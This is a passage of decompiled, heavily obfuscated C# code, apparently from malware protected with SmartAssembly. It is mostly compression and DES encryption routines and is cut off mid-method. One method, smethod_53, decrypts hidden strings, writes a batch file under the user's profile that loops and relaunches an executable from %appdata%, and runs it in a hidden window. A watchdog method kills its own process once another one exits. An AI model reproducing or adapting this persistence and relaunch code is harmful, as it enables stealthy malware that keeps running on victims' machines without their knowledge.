				while (--num7 >= 0)
				{
					num5 = array8[(num5 ^ byte_2[num6++]) & 0xFF] ^ (num5 >> 8);
				}
				num5 ^= num4;
				Class58.smethod_133(stream, 67324752);
				Class58.smethod_91(stream, 20);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 8);
				Class58.smethod_133(stream, (int)num3);
				Class58.smethod_133(stream, (int)num5);
				long position3 = stream.Position;
				Class58.smethod_133(stream, 0);
				Class58.smethod_133(stream, byte_2.Length);
				byte[] bytes = Encoding.UTF8.GetBytes("{data}");
				Class58.smethod_91(stream, bytes.Length);
				Class58.smethod_91(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class58.smethod_46(class2, byte_2);
				while (!class2.IsNeedingInput)
				{
					byte[] array9 = new byte[512];
					int num8 = Class58.smethod_41(array9, class2);
					if (num8 <= 0)
					{
						break;
					}
					stream.Write(array9, 0, num8);
				}
				Class58.smethod_163(class2);
				while (!class2.IsFinished)
				{
					byte[] array10 = new byte[512];
					int num9 = Class58.smethod_41(array10, class2);
					if (num9 <= 0)
					{
						break;
					}
					stream.Write(array10, 0, num9);
				}
				long totalOut = class2.TotalOut;
				Class58.smethod_133(stream, 33639248);
				Class58.smethod_91(stream, 20);
				Class58.smethod_91(stream, 20);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 8);
				Class58.smethod_133(stream, (int)num3);
				Class58.smethod_133(stream, (int)num5);
				Class58.smethod_133(stream, (int)totalOut);
				Class58.smethod_133(stream, byte_2.Length);
				Class58.smethod_91(stream, bytes.Length);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 0);
				Class58.smethod_133(stream, 0);
				Class58.smethod_133(stream, 0);
				stream.Write(bytes, 0, bytes.Length);
				Class58.smethod_133(stream, 101010256);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 0);
				Class58.smethod_91(stream, 1);
				Class58.smethod_91(stream, 1);
				Class58.smethod_133(stream, 46 + bytes.Length);
				Class58.smethod_133(stream, (int)(30 + bytes.Length + totalOut));
				Class58.smethod_91(stream, 0);
				stream.Seek(position3, SeekOrigin.Begin);
				Class58.smethod_133(stream, (int)totalOut);
				break;
			}
			case 1:
			{
				Class58.smethod_133(stream, 25000571);
				Class58.smethod_133(stream, byte_2.Length);
				byte[] array5;
				for (int i = 0; i < byte_2.Length; i += array5.Length)
				{
					array5 = new byte[Math.Min(2097151, byte_2.Length - i)];
					Buffer.BlockCopy(byte_2, i, array5, 0, array5.Length);
					long position = stream.Position;
					Class58.smethod_133(stream, 0);
					Class58.smethod_133(stream, array5.Length);
					Class31.Class37 @class = new Class31.Class37();
					Class58.smethod_46(@class, array5);
					while (!@class.IsNeedingInput)
					{
						byte[] array6 = new byte[512];
						int num = Class58.smethod_41(array6, @class);
						if (num <= 0)
						{
							break;
						}
						stream.Write(array6, 0, num);
					}
					Class58.smethod_163(@class);
					while (!@class.IsFinished)
					{
						byte[] array7 = new byte[512];
						int num2 = Class58.smethod_41(array7, @class);
						if (num2 <= 0)
						{
							break;
						}
						stream.Write(array7, 0, num2);
					}
					long position2 = stream.Position;
					stream.Position = position;
					Class58.smethod_133(stream, (int)@class.TotalOut);
					stream.Position = position2;
				}
				break;
			}
			case 2:
			{
				Class58.smethod_133(stream, 41777787);
				byte[] array3 = Class58.smethod_27((byte[])null, 1, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform2 = Class58.smethod_60(byte_0, byte_1, bool_0: false))
				{
					byte[] array4 = cryptoTransform2.TransformFinalBlock(array3, 0, array3.Length);
					stream.Write(array4, 0, array4.Length);
				}
				break;
			}
			case 3:
			{
				Class58.smethod_133(stream, 58555003);
				byte[] array = Class58.smethod_27((byte[])null, 1, (byte[])null, byte_2);
				using (ICryptoTransform cryptoTransform = Class58.smethod_13(bool_0: false, byte_1, byte_0))
				{
					byte[] array2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
					stream.Write(array2, 0, array2.Length);
				}
				break;
			}
			}
			stream.Flush();
			stream.Close();
			return stream.ToArray();
		}
		catch (Exception ex)
		{
			Class31.string_0 = "ERR 2003: " + ex.Message;
			throw;
		}
	}

	static void smethod_28(Class31.Class33 class33_0, int int_0)
	{
		class33_0.uint_0 >>= int_0;
		class33_0.int_2 -= int_0;
	}

	static void smethod_29(int int_0)
	{
		while (true)
		{
			try
			{
				Process.GetProcessById(int_0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				Process.GetCurrentProcess().Kill();
				ProjectData.ClearProjectError();
			}
			Thread.Sleep(2000);
			GC.Collect();
		}
	}

	static bool smethod_30(bool bool_0, bool bool_1, Class31.Class40 class40_0)
	{
		if (class40_0.int_5 < 262)
		{
			goto IL_0183;
		}
		goto IL_02a7;
		IL_02a7:
		int num2 = default(int);
		int int_ = default(int);
		int num3 = default(int);
		bool flag = default(bool);
		Class31.Class38 class38_ = default(Class31.Class38);
		byte[] byte_ = default(byte[]);
		while (true)
		{
			int num;
			if (class40_0.int_5 >= 262 || bool_1)
			{
				if (class40_0.int_5 != 0)
				{
					if (class40_0.int_4 >= 65274)
					{
						Class58.smethod_165(class40_0);
					}
					goto IL_0050;
				}
				if (!class40_0.bool_0)
				{
					goto IL_00fc;
				}
				num = 4;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_0103;
				}
			}
			else
			{
				num = 17;
				if (IwxRFxvB9dB3g1fRikX())
				{
				}
			}
			goto IL_011f;
			IL_00fc:
			class40_0.bool_0 = false;
			goto IL_0103;
			IL_0103:
			class38_ = class40_0.class38_0;
			byte_ = class40_0.byte_0;
			num = 8;
			if (!IwxRFxvB9dB3g1fRikX())
			{
				goto IL_011f;
			}
			goto IL_01ef;
			IL_00db:
			Class58.smethod_39(class40_0.class38_0, class40_0.byte_0[class40_0.int_4 - 1] & 0xFF);
			goto IL_00fc;
			IL_018e:
			if (num2 >= 3 && class40_0.int_2 <= num2)
			{
				goto IL_01a3;
			}
			if (class40_0.bool_0)
			{
				Class58.smethod_39(class40_0.class38_0, class40_0.byte_0[class40_0.int_4 - 1] & 0xFF);
			}
			goto IL_025b;
			IL_01a3:
			Class31.Class38 class38_2 = class40_0.class38_0;
			int int_2 = class40_0.int_4 - 1 - int_;
			Class58.smethod_52(int_2, num2, class38_2);
			num2 -= 2;
			goto IL_01ca;
			IL_027e:
			if (!Class58.smethod_42(class40_0.class38_0))
			{
				continue;
			}
			num3 = class40_0.int_4 - class40_0.int_3;
			if (class40_0.bool_0)
			{
				num3--;
			}
			goto IL_030e;
			IL_01ca:
			class40_0.int_4++;
			class40_0.int_5--;
			goto IL_01fb;
			IL_0050:
			int_ = class40_0.int_1;
			num2 = class40_0.int_2;
			if (class40_0.int_5 >= 3)
			{
				int num4 = Class58.smethod_61(class40_0);
				if (num4 != 0 && class40_0.int_4 - num4 <= 32506 && Class58.smethod_82(num4, class40_0) && class40_0.int_2 <= 5 && class40_0.int_2 == 3 && class40_0.int_4 - class40_0.int_1 > 4096)
				{
					num = 5;
					if (v2IJBhvCyRSyXwG8iyi())
					{
						goto IL_011f;
					}
					goto IL_01fb;
				}
			}
			goto IL_018e;
			IL_01fb:
			if (class40_0.int_5 >= 3)
			{
				Class58.smethod_61(class40_0);
			}
			goto IL_01ef;
			IL_0349:
			class40_0.int_3 += num3;
			return !flag;
			IL_01ef:
			if (--num2 > 0)
			{
				goto IL_01ca;
			}
			goto IL_0206;
			IL_0206:
			class40_0.int_4++;
			class40_0.int_5--;
			class40_0.bool_0 = false;
			goto IL_0229;
			IL_0229:
			class40_0.int_2 = 2;
			goto IL_027e;
			IL_025b:
			class40_0.bool_0 = true;
			class40_0.int_4++;
			class40_0.int_5--;
			goto IL_027e;
			IL_030e:
			flag = bool_0 && class40_0.int_5 == 0 && !class40_0.bool_0;
			class38_ = class40_0.class38_0;
			byte_ = class40_0.byte_0;
			int int_3 = class40_0.int_3;
			Class58.smethod_136(flag, class38_, byte_, num3, int_3);
			goto IL_0349;
			IL_011f:
			switch (num)
			{
			case 16:
				break;
			case 1:
			case 4:
				goto IL_00db;
			case 3:
				goto IL_0103;
			case 5:
				goto IL_017a;
			case 15:
				goto end_IL_02a7;
			case 10:
				goto IL_01a3;
			case 14:
				goto IL_01ca;
			case 2:
				goto IL_01ef;
			default:
				goto IL_01fb;
			case 13:
				goto IL_0206;
			case 7:
				goto IL_0229;
			case 11:
			case 12:
				goto IL_025b;
			case 8:
			{
				int_3 = class40_0.int_3;
				int int_4 = class40_0.int_4 - class40_0.int_3;
				Class58.smethod_136(bool_0, class38_, byte_, int_4, int_3);
				class40_0.int_3 = class40_0.int_4;
				return false;
			}
			case 17:
				return true;
			case 0:
				goto IL_030e;
			case 6:
				goto IL_0349;
			}
			goto IL_0050;
			IL_017a:
			class40_0.int_2 = 2;
			goto IL_018e;
			continue;
			end_IL_02a7:
			break;
		}
		goto IL_0183;
		IL_0183:
		if (!bool_1)
		{
			return false;
		}
		goto IL_02a7;
	}

	static Assembly smethod_31()
	{
		try
		{
			return Assembly.GetExecutingAssembly();
		}
		catch
		{
			return null;
		}
	}

	static string smethod_32()
	{
		try
		{
			return Application.get_ExecutablePath();
		}
		catch
		{
			return "N/A";
		}
	}

	static short smethod_33(int int_0)
	{
		return (short)((Class31.Class38.byte_0[int_0 & 0xF] << 12) | (Class31.Class38.byte_0[(int_0 >> 4) & 0xF] << 8) | (Class31.Class38.byte_0[(int_0 >> 8) & 0xF] << 4) | Class31.Class38.byte_0[int_0 >> 12]);
	}

	static Exception smethod_34(object[] object_0, Exception exception_0)
	{
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0082: Expected O, but got Unknown
		try
		{
			if ((object)exception_0.GetType() == typeof(Exception))
			{
				if (!IwxRFxvB9dB3g1fRikX())
				{
					switch (3)
					{
					case 0:
					case 3:
						break;
					default:
						goto IL_005f;
					}
				}
				if (exception_0.Message == "{report}")
				{
					exception_0 = exception_0.InnerException;
					goto IL_005f;
				}
			}
			Class58.smethod_19(exception_0, object_0);
			goto IL_005f;
			IL_005f:
			Class54.Handler.method_3(exception_0, bool_1: true, bool_2: false);
		}
		catch
		{
		}
		return (Exception)new SoapException(exception_0.Message, SoapException.ServerFaultCode);
	}

	static void smethod_35()
	{
		string text = "";
	}

	static void smethod_36(Class31.Class38 class38_0)
	{
		class38_0.int_1 = 0;
		class38_0.int_2 = 0;
	}

	static bool smethod_37(Class31.Class32 class32_0)
	{
		int int_ = class32_0.int_4;
		bool result = default(bool);
		int num3 = default(int);
		while (true)
		{
			int num;
			int num4;
			switch (int_)
			{
			case 12:
				result = false;
				num = 13;
				if (IwxRFxvB9dB3g1fRikX())
				{
				}
				goto IL_0054;
			case 6:
				if (Class58.smethod_126(class32_0.class36_0, class32_0.class33_0))
				{
					class32_0.class35_0 = Class58.smethod_135(class32_0.class36_0);
					class32_0.class35_1 = Class58.smethod_145(class32_0.class36_0);
					num = 8;
					if (!IwxRFxvB9dB3g1fRikX())
					{
						goto IL_0054;
					}
					goto IL_020f;
				}
				result = false;
				break;
			case 2:
				if (class32_0.bool_0)
				{
					class32_0.int_4 = 12;
					num = 12;
					if (IwxRFxvB9dB3g1fRikX())
					{
					}
					goto IL_0054;
				}
				num3 = Class58.smethod_10(class32_0.class33_0, 3);
				if (num3 >= 0)
				{
					Class58.smethod_28(class32_0.class33_0, 3);
					if (((uint)num3 & (true ? 1u : 0u)) != 0)
					{
						class32_0.bool_0 = true;
					}
					goto IL_001c;
				}
				result = false;
				break;
			case 3:
				if ((class32_0.int_8 = Class58.smethod_10(class32_0.class33_0, 16)) < 0)
				{
					result = false;
					break;
				}
				Class58.smethod_28(class32_0.class33_0, 16);
				class32_0.int_4 = 4;
				goto case 4;
			case 4:
			{
				int num2 = Class58.smethod_10(class32_0.class33_0, 16);
				if (num2 < 0)
				{
					result = false;
					break;
				}
				Class58.smethod_28(class32_0.class33_0, 16);
				class32_0.int_4 = 5;
				goto IL_0243;
			}
			default:
				result = false;
				break;
			case 7:
			case 8:
			case 9:
			case 10:
				goto IL_020f;
			case 5:
				goto IL_0243;
				IL_0269:
				if (class32_0.int_8 == 0)
				{
					class32_0.int_4 = 2;
					result = true;
				}
				else
				{
					result = !class32_0.class33_0.IsNeedingInput;
				}
				break;
				IL_001c:
				switch (num3 >> 1)
				{
				case 1:
					break;
				case 0:
					Class58.smethod_127(class32_0.class33_0);
					class32_0.int_4 = 3;
					goto IL_028d;
				case 2:
					class32_0.class36_0 = new Class31.Class36();
					class32_0.int_4 = 6;
					goto IL_028d;
				default:
					goto IL_028d;
				}
				class32_0.class35_0 = Class31.Class35.class35_0;
				num = 0;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					break;
				}
				goto IL_0054;
				IL_020f:
				result = Class58.smethod_85(class32_0);
				break;
				IL_0054:
				switch (num)
				{
				case 9:
					break;
				case 7:
					continue;
				case 0:
					class32_0.class35_1 = Class31.Class35.class35_1;
					class32_0.int_4 = 7;
					goto IL_028d;
				case 8:
					class32_0.int_4 = 7;
					goto IL_020f;
				case 4:
					goto IL_020f;
				case 10:
					goto IL_0243;
				case 3:
					goto IL_0269;
				case 11:
					goto IL_028d;
				case 1:
				case 12:
					result = false;
					goto end_IL_013d;
				default:
					goto end_IL_013d;
				}
				goto IL_001c;
				IL_0243:
				num4 = Class58.smethod_120(class32_0.class34_0, class32_0.class33_0, class32_0.int_8);
				class32_0.int_8 -= num4;
				goto IL_0269;
				IL_028d:
				result = true;
				break;
				end_IL_013d:
				break;
			}
			break;
		}
		return result;
	}

	static void smethod_38(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5)
	{
		Class58.smethod_19(exception_0, new object[6] { object_0, object_1, object_2, object_3, object_4, object_5 });
	}

	static bool smethod_39(Class31.Class38 class38_0, int int_0)
	{
		class38_0.short_0[class38_0.int_1] = 0;
		class38_0.byte_1[class38_0.int_1++] = (byte)int_0;
		class38_0.class39_0.short_0[int_0]++;
		return Class58.smethod_42(class38_0);
	}

	static void smethod_40(Class45 class45_0)
	{
		if (v2IJBhvCyRSyXwG8iyi())
		{
			switch (3)
			{
			case 0:
			case 3:
				break;
			case 1:
			case 4:
				goto IL_0035;
			default:
				goto IL_0038;
			case 5:
				return;
			}
		}
		EventHandler eventHandler_ = class45_0.eventHandler_0;
		goto IL_0035;
		IL_0038:
		eventHandler_(class45_0, EventArgs.Empty);
		return;
		IL_0035:
		if (eventHandler_ == null)
		{
			return;
		}
		goto IL_0038;
	}

	[DllImport("kernel32")]
	internal static extern bool MoveFileEx(string string_0, string string_1, int int_0);

	static int smethod_41(byte[] byte_0, Class31.Class37 class37_0)
	{
		int num = 0;
		int num2 = byte_0.Length;
		int num6 = default(int);
		while (true)
		{
			int num3 = num2;
			while (true)
			{
				int num4 = Class58.smethod_124(class37_0.class41_0, byte_0, num, num2);
				num += num4;
				class37_0.long_0 += num4;
				num2 -= num4;
				while (true)
				{
					if (num2 != 0 && class37_0.int_0 != 30)
					{
						int num5 = 0;
						if (!v2IJBhvCyRSyXwG8iyi())
						{
							break;
						}
						while (true)
						{
							switch (num5)
							{
							case 0:
							case 2:
							{
								Class31.Class40 class40_ = class37_0.class40_0;
								bool bool_ = (class37_0.int_0 & 4) != 0;
								if (Class58.smethod_96((class37_0.int_0 & 8) != 0, class40_, bool_))
								{
									goto end_IL_00c7;
								}
								if (class37_0.int_0 != 16)
								{
									if (class37_0.int_0 != 20)
									{
										if (class37_0.int_0 != 28)
										{
											goto end_IL_00c7;
										}
										Class58.smethod_2(class37_0.class41_0);
										num5 = 4;
										if (v2IJBhvCyRSyXwG8iyi())
										{
											continue;
										}
									}
									goto case 3;
								}
								return num3 - num2;
							}
							case 5:
								break;
							case 4:
								class37_0.int_0 = 30;
								goto end_IL_00c7;
							case 3:
							case 6:
								num6 = 8 + (-class37_0.class41_0.BitCount & 7);
								goto IL_00f4;
							default:
								num6 -= 10;
								goto IL_00f4;
							case 8:
							case 9:
								goto end_IL_00c7;
							case 1:
								goto end_IL_0118;
								IL_00f4:
								if (num6 > 0)
								{
									Class58.smethod_83(class37_0.class41_0, 2, 10);
									goto default;
								}
								class37_0.int_0 = 16;
								goto end_IL_00c7;
							}
							break;
						}
						continue;
					}
					return num3 - num2;
					continue;
					end_IL_00c7:
					break;
				}
				continue;
				end_IL_0118:
				break;
			}
		}
	}

	static bool smethod_42(Class31.Class38 class38_0)
	{
		return class38_0.int_1 >= 16384;
	}

	static void smethod_43(Class31.Class34 class34_0, int int_0, int int_1, int int_2)
	{
		while (int_1-- > 0)
		{
			class34_0.byte_0[class34_0.int_0++] = class34_0.byte_0[int_0++];
			class34_0.int_0 &= 32767;
			int_0 &= 0x7FFF;
		}
	}

	static void smethod_44(Class31.Class34 class34_0, int int_0)
	{
		int num = class34_0.int_1++;
		int num2 = 2;
		if (v2IJBhvCyRSyXwG8iyi())
		{
			while (true)
			{
				switch (num2)
				{
				default:
					num2 = 3;
					if (!IwxRFxvB9dB3g1fRikX())
					{
						continue;
					}
					goto IL_006f;
				case 0:
				case 2:
					break;
				case 1:
				case 3:
					goto IL_006f;
				case 4:
					goto IL_0075;
				}
				break;
			}
		}
		if (num == 32768)
		{
			goto IL_006f;
		}
		class34_0.byte_0[class34_0.int_0++] = (byte)int_0;
		goto IL_0075;
		IL_006f:
		throw new InvalidOperationException();
		IL_0075:
		class34_0.int_0 &= 32767;
	}

	static void smethod_45(Class44 class44_0, Enum4 enum4_0)
	{
		Class58.smethod_159(class44_0, enum4_0, string.Empty);
	}

	static void smethod_46(Class31.Class37 class37_0, byte[] byte_0)
	{
		Class58.smethod_63(byte_0, class37_0.class40_0);
	}

	static void smethod_47(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4, object object_5, object object_6, object object_7)
	{
		Class58.smethod_19(exception_0, new object[8] { object_0, object_1, object_2, object_3, object_4, object_5, object_6, object_7 });
	}

	static void smethod_48(Exception exception_0, object object_0, object object_1, object object_2, object object_3, object object_4)
	{
		Class58.smethod_19(exception_0, new object[5] { object_0, object_1, object_2, object_3, object_4 });
	}

	static int smethod_49(Class31.Stream0 stream0_0)
	{
		return stream0_0.ReadByte() | (stream0_0.ReadByte() << 8);
	}

	static void smethod_50(string string_0, string string_1, EventArgs1 eventArgs1_0)
	{
		Class58.smethod_90((object)string_1, string_0, eventArgs1_0.class45_0);
	}

	static byte[] smethod_51(byte[] byte_0, byte[] byte_1, byte[] byte_2)
	{
		return Class58.smethod_27(byte_2, 2, byte_0, byte_1);
	}

	static bool smethod_52(int int_0, int int_1, Class31.Class38 class38_0)
	{
		class38_0.short_0[class38_0.int_1] = (short)int_0;
		while (true)
		{
			IL_00a5:
			class38_0.byte_1[class38_0.int_1++] = (byte)(int_1 - 3);
			int num = Class58.smethod_14(class38_0, int_1 - 3);
			class38_0.class39_0.short_0[num]++;
			if (num >= 265 && num < 285)
			{
				goto IL_0079;
			}
			goto IL_008f;
			IL_0079:
			class38_0.int_2 += (num - 261) / 4;
			goto IL_008f;
			IL_008f:
			int num2 = Class58.smethod_166(class38_0, int_0 - 1);
			while (true)
			{
				IL_0053:
				class38_0.class39_1.short_0[num2]++;
				if (num2 >= 4)
				{
					while (true)
					{
						class38_0.int_2 += num2 / 2 - 1;
						if (!v2IJBhvCyRSyXwG8iyi())
						{
							break;
						}
						switch (6)
						{
						case 1:
						case 3:
							break;
						default:
							goto IL_0053;
						case 4:
							goto end_IL_0014;
						case 5:
							goto IL_00a5;
						case 6:
							goto IL_00f4;
						}
						continue;
						end_IL_0014:
						break;
					}
					break;
				}
				goto IL_00f4;
				IL_00f4:
				return Class58.smethod_42(class38_0);
			}
			goto IL_0079;
		}
	}

	static void smethod_53()
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		StreamWriter streamWriter = default(StreamWriter);
		string text = default(string);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				string text2;
				string text3;
				string text4;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 829:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_002a;
						case 4:
							goto IL_0047;
						case 5:
							goto IL_0069;
						case 6:
							goto IL_0086;
						case 7:
							goto IL_0098;
						case 8:
							goto IL_00e4;
						case 9:
							goto IL_00ef;
						case 10:
							goto IL_0104;
						case 11:
							goto IL_0114;
						case 12:
							goto IL_0124;
						case 13:
							goto IL_0134;
						case 14:
							goto IL_0149;
						case 15:
							goto IL_0159;
						case 16:
							goto IL_016e;
						case 17:
							goto IL_017e;
						case 18:
							goto IL_018e;
						case 19:
							goto IL_019e;
						case 20:
							goto IL_01c1;
						case 21:
							goto IL_0217;
						case 22:
							goto IL_0227;
						case 23:
							goto IL_023c;
						case 24:
							goto IL_024c;
						case 25:
							goto IL_025c;
						case 26:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 27:
						case 28:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_025c:
					num = 25;
					streamWriter.Dispose();
					break;
					IL_0008:
					num = 2;
					text = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("923lYoAhb2vVXIM6u3MCzjKugVDBXZMcbb6ThbsL5r8=");
					goto IL_002a;
					IL_002a:
					num = 3;
					text2 = Interaction.Environ(Class58.smethod_109("rRhnphBugUiRcVlpVgLfjw==")) + "\\temp\\";
					goto IL_0047;
					IL_0047:
					num = 4;
					text3 = Interaction.Environ(Class58.smethod_109("5g+BxFHXkdTcEM3cEGgk0A==")) + Class58.smethod_109("sscpRZTSpuugDgOvmaPPPu6b/X9gZRYeKcyavwZ3WPM=");
					goto IL_0069;
					IL_0069:
					num = 5;
					File.Delete(text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\9p12f/nXPDi4YbupHn4TFQ==.bat");
					goto IL_0086;
					IL_0086:
					num = 6;
					if (Class58.smethod_18("cmd"))
					{
						goto end_IL_0000_3;
					}
					goto IL_0098;
					IL_0098:
					num = 7;
					streamWriter = new StreamWriter(text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + ".bat");
					goto IL_00e4;
					IL_00e4:
					num = 8;
					streamWriter.AutoFlush = true;
					goto IL_00ef;
					IL_00ef:
					num = 9;
					streamWriter.Write(Class58.smethod_109("31RKsOSvI9/AFuhKog3NgA=="));
					goto IL_0104;
					IL_0104:
					num = 10;
					streamWriter.Write(Environment.NewLine);
					goto IL_0114;
					IL_0114:
					num = 11;
					streamWriter.Write("timeout /t @@");
					goto IL_0124;
					IL_0124:
					num = 12;
					streamWriter.Write(Environment.NewLine);
					goto IL_0134;
					IL_0134:
					num = 13;
					streamWriter.Write(Class58.smethod_109("sVCCMiKQCYeTpQSTFrz5DMemSYSw/JzXBSYI+oN2BW6+ek8GWRRLCnHl4EtHDxkzJ11cIioJHQYmf/Ko0hLc4w=="));
					goto IL_0149;
					IL_0149:
					num = 14;
					streamWriter.Write(Environment.NewLine);
					goto IL_0159;
					IL_0159:
					num = 15;
					streamWriter.Write(Class58.smethod_109("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_016e;
					IL_016e:
					num = 16;
					streamWriter.Write(Environment.NewLine);
					goto IL_017e;
					IL_017e:
					num = 17;
					streamWriter.Write(") || (");
					goto IL_018e;
					IL_018e:
					num = 18;
					streamWriter.Write(Environment.NewLine);
					goto IL_019e;
					IL_019e:
					num = 19;
					text4 = "%appdata%\\" + Class58.smethod_109("iXIzM98Pjl/u+zlU/h5Dfl19cMP29BJLIWFLWajNT92OKqOYE9q1PcctiVmnH8Ed") + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==");
					goto IL_01c1;
					IL_01c1:
					num = 20;
					streamWriter.Write(" Start /W \"\" \"" + text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + "\"");
					goto IL_0217;
					IL_0217:
					num = 21;
					streamWriter.Write(Environment.NewLine);
					goto IL_0227;
					IL_0227:
					num = 22;
					streamWriter.Write(Class58.smethod_109("OHLI5dgL1wwNBGr/QEZ9WA=="));
					goto IL_023c;
					IL_023c:
					num = 23;
					streamWriter.Write(Environment.NewLine);
					goto IL_024c;
					IL_024c:
					num = 24;
					streamWriter.Write(")");
					goto IL_025c;
					end_IL_0000_2:
					break;
				}
				num = 26;
				Interaction.Shell(text + Class58.smethod_109("fEzc44351CMchjFeeY23eA==") + "\\" + Class58.smethod_109("dI0mWYVQ2eg7SQnnGlyChw==") + ".bat", (AppWinStyle)0, false, -1);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 829;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	static string smethod_54(Form0 form0_0, string string_0)
	{
		string_0 = string_0.Replace("%AppName%", "vf");
		string_0 = string_0.Replace("%CompanyName%", "fbff");
		return string_0;
	}

	static Bitmap smethod_55(string string_0)
	{
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("SmartAssembly.SmartExceptionsCore.Resources." + string_0 + ".png");
			if (v2IJBhvCyRSyXwG8iyi())
			{
				switch (2)
				{
				case 0:
				case 2:
					break;
				default:
					goto IL_0047;
				}
			}
			if (manifestResourceStream != null)
			{
				goto IL_0047;
			}
			object result = null;
			goto IL_004d;
			IL_0047:
			result = (object)new Bitmap(manifestResourceStream);
			goto IL_004d;
			IL_004d:
			return (Bitmap)result;
		}
		catch
		{
			return null;
		}
	}

	static byte[] smethod_56(byte[] byte_0)
	{
		return Class58.smethod_27((byte[])null, 1, (byte[])null, byte_0);
	}

	static int smethod_57(Class31.Stream0 stream0_0)
	{
		return Class58.smethod_49(stream0_0) | (Class58.smethod_49(stream0_0) << 16);
	}

	static int smethod_58(int int_0, int int_1, byte[] byte_0, Class31.Class34 class34_0)
	{
		int num = class34_0.int_0;
		int num3 = default(int);
		int num4 = default(int);
		while (true)
		{
			int num2;
			if (int_0 <= class34_0.int_1)
			{
				num = (class34_0.int_0 - class34_0.int_1 + int_0) & 0x7FFF;
				num2 = 0;
				if (!v2IJBhvCyRSyXwG8iyi())
				{
					goto IL_002f;
				}
				goto IL_008f;
			}
			int_0 = class34_0.int_1;
			goto IL_0083;
			IL_0032:
			Array.Copy(class34_0.byte_0, num - int_0, byte_0, int_1, int_0);
			class34_0.int_1 -= num3;
			if (class34_0.int_1 >= 0)
			{
				break;
			}
			num2 = 6;
			if (!v2IJBhvCyRSyXwG8iyi())
			{
				goto IL_0067;
			}
			goto IL_008f;
			IL_0067:
			Array.Copy(class34_0.byte_0, 32768 - num4, byte_0, int_1, num4);
			int_1 += num4;
			goto IL_002f;
			IL_008f:
			switch (num2)
			{
			case 3:
				break;
			default:
				goto IL_0067;
			case 0:
			case 1:
				goto IL_0083;
			case 4:
				continue;
			case 6:
				throw new InvalidOperationException();
			}
			goto IL_002f;
			IL_0083:
			num3 = int_0;
			num4 = int_0 - num;
			if (num4 <= 0)
			{
				goto IL_0032;
			}
			goto IL_0067;
			IL_002f:
			int_0 = num;
			goto IL_0032;
		}
		return num3;
	}

	static void smethod_59(IWebProxy iwebProxy_0, Class44 class44_0)
	{
		class44_0.iwebProxy_0 = iwebProxy_0;
	}

	static ICryptoTransform smethod_60(byte[] byte_0, byte[] byte_1, bool bool_0)
	{
		using DESCryptoServiceProvider dESCryptoServiceProvider = new DESCryptoServiceProvider();
		return bool_0 ? dESCryptoServiceProvider.CreateDecryptor(byte_1, byte_0) : dESCryptoServiceProvider.CreateEncryptor(byte_1, byte_0);
	}

	static int smethod_61(Class31.Class40 class40_0)
	{
		int num = ((class40_0.int_0 << 5) ^ class40_0.byte_0[class40_0.int_4 + 2]) & 0x7FFF;
		short num2 = (class40_0.short_1[class40_0.int_4 & 0x7FFF] = class40_0.short_0[num]);
		class40_0.short_0[num] = (short)class40_0.int_4;
		class40_0.int_0 = num;
		return num2 & 0xFFFF;
	}

	static void smethod_62(EventArgs1 eventArgs1_0)
	{
		eventArgs1_0.bool_0 = true;
	}

	static void smethod_63(byte[] byte_0, Class31.Class40 class40_0)
	{
		class40_0.byte_1 = byte_0;
		if (v2IJBhvCyRSyXwG8iyi())
		{
			switch (2)
			{
			case 0:
			case 2:
				break;
			default:
				goto IL_0034;
			}
		}
		class40_0.int_7 = 0;
		goto IL_0034;
		IL_0034:
		class40_0.int_8 = byte_0.Length;
	}

	static string smethod_64()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(Class30.SubkeyApplication);
			string result = default(string);
			while (true)
			{
				if (registryKey == null)
				{
					if (v2IJBhvCyRSyXwG8iyi())
					{
						switch (4)
						{
						case 3:
							break;
						case 1:
						case 4:
							goto IL_0043;
						default:
							goto IL_006c;
						case 5:
							goto end_IL_003d;
						}
						continue;
					}
					goto IL_0043;
				}
				goto IL_0053;
				IL_0053:
				if (registryKey == null)
				{
					return null;
				}
				result = (string)registryKey.GetValue("Path", null);
				goto IL_006c;
